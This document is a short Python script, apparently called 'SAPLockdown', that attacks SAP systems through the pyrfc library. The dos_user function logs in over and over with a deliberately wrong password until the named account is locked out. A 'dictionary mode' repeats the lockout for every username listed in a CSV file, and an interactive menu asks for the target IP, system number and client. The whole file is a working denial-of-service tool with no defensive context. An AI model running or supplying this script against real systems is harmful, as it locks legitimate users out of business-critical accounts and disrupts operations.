from pyrfc import Connection
import csv

def dos_user(ashost, sysnr, username, rounds, client):
    cred = {
        'ashost': ashost,
        'sysnr': sysnr,
        'client': client,
        'user': username,
        'passwd': 'DEFINITELYWRONG'
    }

    for x in range(int(rounds)):
        try:
            Connection(**cred)
        except:
            pass

    print("Entered password for '" + username + "' " + str(rounds) + " times.")


def readUsers():
    users = []
    with open('user.csv') as user_csv:
        reader = csv.reader(user_csv)
        for row in reader:
            users.append(row)
    return users


def menu():
    while True:
        print("[0] - End SAPLockdown")
        print("[1] - single mode")
        print("[2] - dictionary mode")
        print("[3] - help")
        inp = input("0, 1, 2 or 3: ")
        if inp == '0':
            break
        elif inp == '1':
            ashost = input("Target IP: ")
            sysnr = input("Systemnumber: ")
            client = input("Client: ")
            username = input("Username: ")
            times = input("Attempts: ")
            dos_user(ashost, sysnr, username, times, client)
        elif inp == '2':
            users = readUsers()
            ashost = input("Target IP: ")
            sysnr = input("Systemnumber: ")
            client = input("Client: ")
            times = input("Attempts: ")
            for user in users:
                dos_user(ashost, sysnr, user[0], times, client)

        elif inp == '3':
            print("Single mode\t Target one user provided via input")
            print("Dictionary mode\t - Target mutiple users.")
            print("Target mutiple users maintained in the user.csv file in same directory. Format is one user per line.")
        else:
            print("Invalid input.")

menu()